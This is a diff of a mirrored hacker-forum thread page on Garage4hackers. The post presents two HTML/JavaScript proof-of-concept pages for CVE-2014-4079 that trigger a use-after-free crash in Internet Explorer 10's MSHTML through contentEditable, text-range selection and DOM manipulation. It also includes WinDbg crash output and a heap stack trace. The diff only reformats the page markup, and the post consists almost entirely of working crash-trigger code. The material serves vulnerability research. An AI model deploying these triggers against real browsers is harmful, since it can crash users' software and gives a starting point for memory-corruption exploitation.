@@ -1,28 +1,25 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/printthread.php?t=7005&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 12:29:36 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=7005&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 12:29:36 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
-<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
-	<base  /><!--[if IE]></base><![endif]-->
-	<meta name="generator" content="vBulletin 4.2.1" />
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+	<base/><!--[if IE]></base><![endif]-->
+	<meta content="vBulletin 4.2.1" name="generator"/>
 
 	
-	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	<link href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" rel="stylesheet" type="text/css"/>
 	
 
 
 
 	<title> CVE-2014-4079 - Internet Explorer 10 Crash PoC</title>
-	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>
 
 </head>
 <body>
 
 <div class="above_body">
-<div id="header" class="floatcontainer">
-<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+<div class="floatcontainer" id="header">
+<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
 </div>
 </div>
 <div class="body_wrapper">
@@ -44,177 +41,177 @@
 		<div class="title">CVE-2014-4079 - Internet Explorer 10 Crash PoC</div>
 	
 	<div class="content">
-		<blockquote class="restore">Analyzed with Page Heap Enabled<br />
-Win7 32-bit<br />
-IE 10<br />
-<br />
-<br />
+		<blockquote class="restore">Analyzed with Page Heap Enabled<br/>
+Win7 32-bit<br/>
+IE 10<br/>
+<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">PoC -1 <br />
-<br />
-<br />
-&lt;!doctype html&gt;<br />
-&lt;html&gt;&lt;HEAD&gt;<br />
-&lt;title&gt;case148472.html&lt;/title&gt;<br />
-&lt;meta http-equiv=&quot;Content-type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;<br />
-&lt;style&gt;<br />
-*:nth-child(5)::before {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; content: 'moof';<br />
-}<br />
-*:nth-child(3) {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; display: inline-block;<br />
-}<br />
-&lt;/style&gt;<br />
-&lt;/HEAD&gt;<br />
-&lt;body&gt;&lt;script&gt;<br />
-document.body.contentEditable = 'true';<br />
-&nbsp;<br />
-elem1 = document.createElement('applet')<br />
-elem2 = document.createElement('table')<br />
-elem3 = document.createElement('br')<br />
-elem4 = document.createElement('q')<br />
-elem5 = document.createElement('dialog')<br />
-elem6 = document.createElement('s')<br />
-elem7 = document.createElement('h6')<br />
-elem8 = document.createElement('b')<br />
-elem9 = document.createElement('table')<br />
-<br />
-<br />
-document.body.appendChild(elem1)<br />
-elem1.appendChild(elem2)<br />
-elem1.appendChild(elem3)<br />
-elem2.appendChild(elem4)<br />
-elem2.appendChild(elem5)<br />
-elem2.appendChild(elem6)<br />
-elem2.appendChild(elem7)<br />
-elem1.appendChild(elem8)<br />
-elem2.appendChild(elem9)<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
-rangeTxt = document.body.createTextRange()<br />
-startNode = elem8<br />
-rangeTxt.moveToElementText(startNode)<br />
-rangeTxt.moveEnd('character', '3')<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
-try{<br />
-&nbsp; &nbsp; &nbsp; &nbsp; rangeTxt.select()<br />
-}<br />
-catch(exception){<br />
-&nbsp; &nbsp; &nbsp; &nbsp; document.write(' Bing0! ')<br />
-}<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
-elem4.parentNode.removeChild(elem4)<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br />
-&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<br />
-<br />
-<br />
-PoC - 2:<br />
-<br />
-<br />
-&lt;!doctype html&gt;<br />
-&lt;html&gt;&lt;HEAD&gt;&lt;title&gt;case264387.html&lt;/title&gt;<br />
-&lt;meta http-equiv=&quot;Content-type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;<br />
-&lt;style&gt;<br />
-*:nth-child(5)::before {<br />
-&nbsp; &nbsp; &nbsp; &nbsp; content: 'moof';<br />
-}<br />
-&lt;/style&gt;<br />
-&lt;/HEAD&gt;&lt;body&gt;<br />
-&lt;script&gt;<br />
-<br />
-<br />
-document.body.contentEditable = 'true';<br />
-&nbsp;<br />
-elem0 = document.createElement('audio')<br />
-elem1 = document.createElement('noscript')<br />
-elem2 = document.createElement('center')<br />
-elem3 = document.createElement('u')<br />
-elem4 = document.createElement('li')<br />
-elem5 = document.createElement('dd')<br />
-elem6 = document.createElement('rt')<br />
-elem7 = document.createElement('noframes')<br />
-elem8 = document.createElement('embed')<br />
-<br />
-<br />
-document.body.appendChild(elem0)<br />
-elem0.appendChild(elem1)<br />
-elem1.appendChild(elem2)<br />
-elem1.appendChild(elem3)<br />
-elem1.appendChild(elem4)<br />
-elem1.appendChild(elem5)<br />
-elem1.appendChild(elem6)<br />
-elem1.appendChild(elem7)<br />
-elem1.appendChild(elem8)<br />
-<br />
-<br />
-rangeTxt = document.body.createTextRange()<br />
-rangeTxt.select()<br />
-<br />
-<br />
-function insertAdjacentElement(){<br />
-&nbsp; &nbsp; &nbsp; &nbsp; try{<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; elem0.insertAdjacentElement('afterbegin', elem5);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; elem2.insertAdjacentElement('beforeend', elem0);<br />
-&nbsp; &nbsp; &nbsp; &nbsp; }<br />
-&nbsp; &nbsp; &nbsp; &nbsp; catch(exception){<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; document.write(' bing0 ')<br />
-&nbsp; &nbsp; &nbsp; &nbsp; }<br />
-}<br />
-document.addEventListener('DOMContentLoaded', insertAdjacentElement, false)<br />
-<br />
-<br />
-&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code><hr />
+	<hr/><code class="bbcode_code">PoC -1 <br/>
+<br/>
+<br/>
+&lt;!doctype html&gt;<br/>
+&lt;html&gt;&lt;HEAD&gt;<br/>
+&lt;title&gt;case148472.html&lt;/title&gt;<br/>
+&lt;meta http-equiv="Content-type" content="text/html;charset=UTF-8"&gt;<br/>
+&lt;style&gt;<br/>
+*:nth-child(5)::before {<br/>
+        content: 'moof';<br/>
+}<br/>
+*:nth-child(3) {<br/>
+        display: inline-block;<br/>
+}<br/>
+&lt;/style&gt;<br/>
+&lt;/HEAD&gt;<br/>
+&lt;body&gt;&lt;script&gt;<br/>
+document.body.contentEditable = 'true';<br/>
+ <br/>
+elem1 = document.createElement('applet')<br/>
+elem2 = document.createElement('table')<br/>
+elem3 = document.createElement('br')<br/>
+elem4 = document.createElement('q')<br/>
+elem5 = document.createElement('dialog')<br/>
+elem6 = document.createElement('s')<br/>
+elem7 = document.createElement('h6')<br/>
+elem8 = document.createElement('b')<br/>
+elem9 = document.createElement('table')<br/>
+<br/>
+<br/>
+document.body.appendChild(elem1)<br/>
+elem1.appendChild(elem2)<br/>
+elem1.appendChild(elem3)<br/>
+elem2.appendChild(elem4)<br/>
+elem2.appendChild(elem5)<br/>
+elem2.appendChild(elem6)<br/>
+elem2.appendChild(elem7)<br/>
+elem1.appendChild(elem8)<br/>
+elem2.appendChild(elem9)<br/>
+                <br/>
+rangeTxt = document.body.createTextRange()<br/>
+startNode = elem8<br/>
+rangeTxt.moveToElementText(startNode)<br/>
+rangeTxt.moveEnd('character', '3')<br/>
+                <br/>
+try{<br/>
+        rangeTxt.select()<br/>
+}<br/>
+catch(exception){<br/>
+        document.write(' Bing0! ')<br/>
+}<br/>
+                <br/>
+elem4.parentNode.removeChild(elem4)<br/>
+                                <br/>
+&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<br/>
+<br/>
+<br/>
+PoC - 2:<br/>
+<br/>
+<br/>
+&lt;!doctype html&gt;<br/>
+&lt;html&gt;&lt;HEAD&gt;&lt;title&gt;case264387.html&lt;/title&gt;<br/>
+&lt;meta http-equiv="Content-type" content="text/html;charset=UTF-8"&gt;<br/>
+&lt;style&gt;<br/>
+*:nth-child(5)::before {<br/>
+        content: 'moof';<br/>
+}<br/>
+&lt;/style&gt;<br/>
+&lt;/HEAD&gt;&lt;body&gt;<br/>
+&lt;script&gt;<br/>
+<br/>
+<br/>
+document.body.contentEditable = 'true';<br/>
+ <br/>
+elem0 = document.createElement('audio')<br/>
+elem1 = document.createElement('noscript')<br/>
+elem2 = document.createElement('center')<br/>
+elem3 = document.createElement('u')<br/>
+elem4 = document.createElement('li')<br/>
+elem5 = document.createElement('dd')<br/>
+elem6 = document.createElement('rt')<br/>
+elem7 = document.createElement('noframes')<br/>
+elem8 = document.createElement('embed')<br/>
+<br/>
+<br/>
+document.body.appendChild(elem0)<br/>
+elem0.appendChild(elem1)<br/>
+elem1.appendChild(elem2)<br/>
+elem1.appendChild(elem3)<br/>
+elem1.appendChild(elem4)<br/>
+elem1.appendChild(elem5)<br/>
+elem1.appendChild(elem6)<br/>
+elem1.appendChild(elem7)<br/>
+elem1.appendChild(elem8)<br/>
+<br/>
+<br/>
+rangeTxt = document.body.createTextRange()<br/>
+rangeTxt.select()<br/>
+<br/>
+<br/>
+function insertAdjacentElement(){<br/>
+        try{<br/>
+                elem0.insertAdjacentElement('afterbegin', elem5);<br/>
+                elem2.insertAdjacentElement('beforeend', elem0);<br/>
+        }<br/>
+        catch(exception){<br/>
+                document.write(' bing0 ')<br/>
+        }<br/>
+}<br/>
+document.addEventListener('DOMContentLoaded', insertAdjacentElement, false)<br/>
+<br/>
+<br/>
+&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code><hr/>
 </div><div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">2:038&gt; g(a68.d98): Access violation - code c0000005 (first chance)<br />
-First chance exceptions are reported before any exception handling.<br />
-This exception may be expected and handled.<br />
-eax=083f8f70 ebx=0500b6a0 ecx=e33f92e2 edx=00020040 esi=0805cfa0 edi=083f8f70<br />
-eip=6685a5c0 esp=0500b5a4 ebp=0500b5d0 iopl=0&nbsp; &nbsp; &nbsp; &nbsp;  nv up ei pl zr na pe nc<br />
-cs=001b&nbsp; ss=0023&nbsp; ds=0023&nbsp; es=0023&nbsp; fs=003b&nbsp; gs=0000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  efl=00010246<br />
-MSHTML!CGeneratedContent::Doc:<br />
-6685a5c0 f6400a10&nbsp; &nbsp; &nbsp; &nbsp; test&nbsp; &nbsp; byte ptr [eax+0Ah],10h&nbsp; &nbsp;  ds:0023:083f8f7a=??<br />
-<br />
-<br />
-<br />
-<br />
-2:038&gt; !heap -p -a eax<br />
-&nbsp; &nbsp; address 083f8f70 found in<br />
-&nbsp; &nbsp; _DPH_HEAP_ROOT @ 1391000<br />
-&nbsp; &nbsp; in free-ed allocation (&nbsp; DPH_HEAP_BLOCK:&nbsp; &nbsp; &nbsp; &nbsp;  VirtAddr&nbsp; &nbsp; &nbsp; &nbsp;  VirtSize)<br />
-&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 8372bc8:&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 83f8000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  2000<br />
-&nbsp; &nbsp; 6fa190b2 verifier!AVrfDebugPageHeapFree+0x000000c2<br />
-&nbsp; &nbsp; 778166ac ntdll!RtlDebugFreeHeap+0x0000002f<br />
-&nbsp; &nbsp; 777da13e ntdll!RtlpFreeHeap+0x0000005d<br />
-&nbsp; &nbsp; 777a65a6 ntdll!RtlFreeHeap+0x00000142<br />
-&nbsp; &nbsp; 7620c484 kernel32!HeapFree+0x00000014<br />
-&nbsp; &nbsp; 66d2322b MSHTML!CGeneratedTreeNode::SubRelease+0x00000059<br />
-&nbsp; &nbsp; 669c786a MSHTML!CGeneratedTreeNode::Release+0x00000049<br />
-&nbsp; &nbsp; 66d428fa MSHTML!CGeneratedContentInfo::ReleaseNodes+0x00000136<br />
-&nbsp; &nbsp; 66a0378b MSHTML!CElement::ComputeFormatsVirtual+0x00002641<br />
-&nbsp; &nbsp; 66d9149c MSHTML!CElement::ComputeFormats+0x00000208<br />
-&nbsp; &nbsp; 6685bb89 MSHTML!CTreeNode::ComputeFormats+0x00000093<br />
-&nbsp; &nbsp; 66da64c4 MSHTML!CGeneratedElement::ComputeFormatsVirtual+0x0000009e<br />
-&nbsp; &nbsp; 66c4d661 MSHTML!CTreeNode::ComputeFormats+0x0000018d<br />
-&nbsp; &nbsp; 6685be6f MSHTML!CTreeNode::ComputeFormatsHelper+0x0000003a<br />
-&nbsp; &nbsp; 66aa031b MSHTML!CTreeNode::GetFancyFormat+0x0000003e<br />
-&nbsp; &nbsp; 66c4cf6b MSHTML!CTreeNode::CacheStyleForLayout+0x0000002f<br />
-&nbsp; &nbsp; 67115271 MSHTML!TextBlock_IsValidInsertionPosition+0x00000048<br />
-&nbsp; &nbsp; 6741b2a0 MSHTML!memcpy+0x0013f642<br />
-&nbsp; &nbsp; 66a7a2a2 MSHTML!CHTMLEditor::GetSiteContainer+0x0000004e<br />
-&nbsp; &nbsp; 66a79bbc MSHTML!CHTMLEditor::AdjustPointer+0x00000293<br />
-&nbsp; &nbsp; 66a79901 MSHTML!CEditTracker::AdjustPointerForInsert+0x00000087<br />
-&nbsp; &nbsp; 66a7a908 MSHTML!CCaretTracker::PositionCaretAt+0x00000153<br />
-&nbsp; &nbsp; 66a7ab4b MSHTML!CCaretTracker::Init2+0x000000ab<br />
-&nbsp; &nbsp; 66a792cf MSHTML!CSelectionManager::SetCurrentTracker+0x0000002e<br />
-&nbsp; &nbsp; 672997da MSHTML!CSelectionManager::PositionCaret+0x0000003e<br />
-&nbsp; &nbsp; 672c82c4 MSHTML!CSelectTracker::BecomePassive+0x0000008d<br />
-&nbsp; &nbsp; 672cc32d MSHTML!CSelectTracker::HandleMessagePrivate+0x000001bf<br />
-&nbsp; &nbsp; 672cc9de MSHTML!CSelectTracker::HandleEvent+0x00000180<br />
-&nbsp; &nbsp; 66d3c2f9 MSHTML!CSelectionManager::HandleEvent+0x0000008b<br />
-&nbsp; &nbsp; 66d3c4fd MSHTML!CHTMLEditor::PostHandleEvent+0x0000007d<br />
-&nbsp; &nbsp; 66d3c476 MSHTML!CHTMLEditorProxy::PostHandleEvent+0x0000001e<br />
-&nbsp; &nbsp; 66a96084 MSHTML!CDoc::HandleSelectionMessage+0x00000124</code><hr />
+	<hr/><code class="bbcode_code">2:038&gt; g(a68.d98): Access violation - code c0000005 (first chance)<br/>
+First chance exceptions are reported before any exception handling.<br/>
+This exception may be expected and handled.<br/>
+eax=083f8f70 ebx=0500b6a0 ecx=e33f92e2 edx=00020040 esi=0805cfa0 edi=083f8f70<br/>
+eip=6685a5c0 esp=0500b5a4 ebp=0500b5d0 iopl=0         nv up ei pl zr na pe nc<br/>
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246<br/>
+MSHTML!CGeneratedContent::Doc:<br/>
+6685a5c0 f6400a10        test    byte ptr [eax+0Ah],10h     ds:0023:083f8f7a=??<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+2:038&gt; !heap -p -a eax<br/>
+    address 083f8f70 found in<br/>
+    _DPH_HEAP_ROOT @ 1391000<br/>
+    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)<br/>
+                                    8372bc8:          83f8000             2000<br/>
+    6fa190b2 verifier!AVrfDebugPageHeapFree+0x000000c2<br/>
+    778166ac ntdll!RtlDebugFreeHeap+0x0000002f<br/>
+    777da13e ntdll!RtlpFreeHeap+0x0000005d<br/>
+    777a65a6 ntdll!RtlFreeHeap+0x00000142<br/>
+    7620c484 kernel32!HeapFree+0x00000014<br/>
+    66d2322b MSHTML!CGeneratedTreeNode::SubRelease+0x00000059<br/>
+    669c786a MSHTML!CGeneratedTreeNode::Release+0x00000049<br/>
+    66d428fa MSHTML!CGeneratedContentInfo::ReleaseNodes+0x00000136<br/>
+    66a0378b MSHTML!CElement::ComputeFormatsVirtual+0x00002641<br/>
+    66d9149c MSHTML!CElement::ComputeFormats+0x00000208<br/>
+    6685bb89 MSHTML!CTreeNode::ComputeFormats+0x00000093<br/>
+    66da64c4 MSHTML!CGeneratedElement::ComputeFormatsVirtual+0x0000009e<br/>
+    66c4d661 MSHTML!CTreeNode::ComputeFormats+0x0000018d<br/>
+    6685be6f MSHTML!CTreeNode::ComputeFormatsHelper+0x0000003a<br/>
+    66aa031b MSHTML!CTreeNode::GetFancyFormat+0x0000003e<br/>
+    66c4cf6b MSHTML!CTreeNode::CacheStyleForLayout+0x0000002f<br/>
+    67115271 MSHTML!TextBlock_IsValidInsertionPosition+0x00000048<br/>
+    6741b2a0 MSHTML!memcpy+0x0013f642<br/>
+    66a7a2a2 MSHTML!CHTMLEditor::GetSiteContainer+0x0000004e<br/>
+    66a79bbc MSHTML!CHTMLEditor::AdjustPointer+0x00000293<br/>
+    66a79901 MSHTML!CEditTracker::AdjustPointerForInsert+0x00000087<br/>
+    66a7a908 MSHTML!CCaretTracker::PositionCaretAt+0x00000153<br/>
+    66a7ab4b MSHTML!CCaretTracker::Init2+0x000000ab<br/>
+    66a792cf MSHTML!CSelectionManager::SetCurrentTracker+0x0000002e<br/>
+    672997da MSHTML!CSelectionManager::PositionCaret+0x0000003e<br/>
+    672c82c4 MSHTML!CSelectTracker::BecomePassive+0x0000008d<br/>
+    672cc32d MSHTML!CSelectTracker::HandleMessagePrivate+0x000001bf<br/>
+    672cc9de MSHTML!CSelectTracker::HandleEvent+0x00000180<br/>
+    66d3c2f9 MSHTML!CSelectionManager::HandleEvent+0x0000008b<br/>
+    66d3c4fd MSHTML!CHTMLEditor::PostHandleEvent+0x0000007d<br/>
+    66d3c476 MSHTML!CHTMLEditorProxy::PostHandleEvent+0x0000001e<br/>
+    66a96084 MSHTML!CDoc::HandleSelectionMessage+0x00000124</code><hr/>
 </div></blockquote>
 	</div>
 </li>
@@ -223,14 +220,14 @@ MSHTML!CGeneratedContent::Doc:<br />
 
 </div>
 <div class="below_body">
-<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">04:07 PM</span>.</div>
+<div class="footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">04:07 PM</span>.</div>
 
-<div id="footer_copyright" class="footer_copyright">
+<div class="footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
-<div id="footer_morecopyright" class="footer_morecopyright">
+<div class="footer_morecopyright" id="footer_morecopyright">
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
 	
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
@@ -248,7 +245,7 @@ try{
 var pageTracker = _gat._getTracker('UA-17311051-3');
 pageTracker._trackPageview();
 } catch(err) {}</script>
-</body>
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=7005&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 12:29:36 GMT -->
-</html>
+
+
+</body><!-- Mirrored from garage4hackers.com/printthread.php?t=7005&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 12:29:36 GMT --></html>
